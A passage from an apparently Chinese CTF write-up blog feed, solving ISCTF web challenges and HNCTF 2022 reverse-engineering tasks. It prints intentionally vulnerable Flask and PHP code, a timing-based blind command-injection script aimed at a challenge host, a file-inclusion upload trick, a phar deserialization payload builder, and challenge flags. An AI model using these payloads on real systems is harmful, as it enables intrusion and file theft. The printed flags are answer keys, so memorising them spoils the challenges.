class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.<span class="title function_ invoke__">read</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">action_rce</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">    elif flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        action = flask.request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.<span class="title function_ invoke__">write</span>(action[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        res = subprocess.<span class="title function_ invoke__">run</span>([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(debug=True)</span><br></pre></td></tr></table></figure><p>分析代码发现是在/rce这个路由情况下就可以通过POST传入参数act，然后传入的内容的首位和末位都会被裁剪，然后再执行传入的参数。 所以这个题目可以采用命令盲注，利用sleep来注入（备注：题目提示无回显shell，尝试反弹shell、dnslog都失败，感觉这题无回显不出网，可能这个靶机是不连外网的。）</p><p>采用命令盲注，利用sleep来注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://120.79.18.34:20650/rce&quot;</span></span><br><span class="line"></span><br><span class="line">strs = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dics = <span class="string">&quot;abcdefgh ijklmnopqrstuvwxyz&#123;&#125;[].1234567890QAZWSXEDCRFVTGBYHNUJMIKOLP?-&quot;</span></span><br><span class="line"><span class="keyword">for</span> num1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> st <span class="keyword">in</span> dics:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;act&#x27;</span>: <span class="string">&#x27;1a=`cat 1.txt`;if [ &quot;$&#123;&#x27;</span>+<span class="string">&#x27;a:&#123;&#125;:&#x27;</span>.<span class="built_in">format</span>(num1)+<span class="string">&#x27;1&#125;&quot; == &#x27;</span>+<span class="string">&#x27;&quot;&#123;&#125;&quot; ];then sleep 2;fi1&#x27;</span>.<span class="built_in">format</span>(st)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(num1)</span><br><span class="line">            strs = strs+st</span><br><span class="line">            <span class="built_in">print</span>(strs)</span><br><span class="line"><span class="built_in">print</span>(strs)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/5rqj1YdHnRFzGhc.png" alt="image-20221106155842877.png">)</p><h2 id="crazy-onlineshell"><a href="#crazy-onlineshell" class="headerlink" title="crazy-onlineshell"></a>crazy-onlineshell</h2><p>在easy-onlineshell基础上加了些过滤，同款脚本也能跑。</p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>目录扫一下找到www.rar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line"> <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在文件包含漏洞，结合文件上传，可以上传一个jpg然后利用这个包含，上传文件如下：</p><p>先上传个php文件把Content-Type: application/octet-stream</p><p>改成image/jpeg，发现还是非法文件，说明文件本身也有验证。那么传入：</p><p><img src="https://s2.loli.net/2023/08/04/kL1RgqyB7cVsIdm.png" alt="image-20221108092202957.png"></p><p>把后缀命改成jpg后上传，再包含它即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:http://120.79.18.34:20635/?file=uplO4d/exp.jpg</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/aERSGHOLwXFKV3P.png" alt="image-20221108092327637.png"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计，发现有个文件包含漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>存在file_exists方法，这个方法可以触发phar反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>playload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></figure><p>生成phar文件，注意phpini中phar.readonly设置为Off，改后缀为jpg</p><p>之后文件读取它，?img_name=phar://upload/phar.jpg</p><p>ISCTF{597a25db-eaa2-473e-9893-a578645f1f818}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wb </tag>
            
            <tag> WP </tag>
            
            <tag> ISCTF </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022 全方向部分-Writeup</title>
      <link href="/posts/9d7b.html"/>
      <url>/posts/9d7b.html</url>
      
        <content type="html"><![CDATA[<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="超级签到"><a href="#超级签到" class="headerlink" title="超级签到"></a>超级签到</h3><p><img src="https://s2.loli.net/2023/08/04/nE3w1mQdbVBuTFk.png" alt="image-20221012160242556.png"></p><p>逻辑就是输入的Str1和Str2进行比较，flag就是Str2，不过这里当Str2[j] == 111时被替换成Str2[j] == 48。即把o替换成0。</p><p>NSSCTF{hell0_w0rld}</p><h3 id="贝斯是什么乐器啊？"><a href="#贝斯是什么乐器啊？" class="headerlink" title="贝斯是什么乐器啊？"></a>贝斯是什么乐器啊？</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">160</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">124</span>]; <span class="comment">// [rsp+C0h] [rbp+40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+13Ch] [rbp+BCh]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">    Str[i] -= i;</span><br><span class="line">  base64_encode(Str2, Str);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(enc, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Str做了个小混淆，然后经过base64加密。那么密文就是enc。</p><p><img src="https://s2.loli.net/2023/08/04/dacXPnpq2b4yuv8.png" alt="image-20221012161359666.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;NRQ@PAu;8j[+(R:2806.i&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">ord</span>(<span class="built_in">str</span>[i]) + i</span><br><span class="line">    flag += <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{B@se64_HAHAHA}</p><h3 id="X0r"><a href="#X0r" class="headerlink" title="X0r"></a>X0r</h3><h3 id="给阿姨倒一杯Jvav"><a href="#给阿姨倒一杯Jvav" class="headerlink" title="给阿姨倒一杯Jvav"></a>给阿姨倒一杯Jvav</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reverse</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Reverse</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag ：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is ：&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="type">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span>[] arr)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">64</span> ^ <span class="number">32</span>;</span><br><span class="line">            Resultlist.add(result);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] KEY = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;</span><br><span class="line">        ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; KEY.length; ++j) &#123;</span><br><span class="line">            KEYList.add(KEY[j]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java逆向，拖到ij里面。flag被Encrypt加密了，加密逻辑就是flag的每一位加上64^32。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">str</span>[i] - <span class="number">64</span> ^ <span class="number">32</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{This_is_the_flag_!}</p><h3 id="你知道什么是Py嘛？"><a href="#你知道什么是Py嘛？" class="headerlink" title="你知道什么是Py嘛？"></a>你知道什么是Py嘛？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td 